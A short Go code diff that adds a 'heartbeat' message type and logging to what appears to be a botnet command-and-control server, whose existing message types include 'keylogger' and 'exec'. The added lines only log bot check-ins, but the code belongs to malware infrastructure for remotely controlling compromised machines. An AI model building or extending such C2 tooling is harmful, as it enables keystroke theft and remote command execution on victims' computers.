@@ -17,6 +17,7 @@ const (
 	ERROR_MSG = "error"
 	KEYLOGGER = "keylogger"
 	EXEC      = "exec"
+	HEARTBEAT = "heartbeat"
 )
 
 func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
@@ -73,6 +74,8 @@ func (c *c2) listentoBot(bot *Bot) {
 
 		case KEYLOGGER:
 
+		case HEARTBEAT:
+			log.Println("Recieved Heartbeat From Bot : ", bot.ID)
 		}
 
 	}
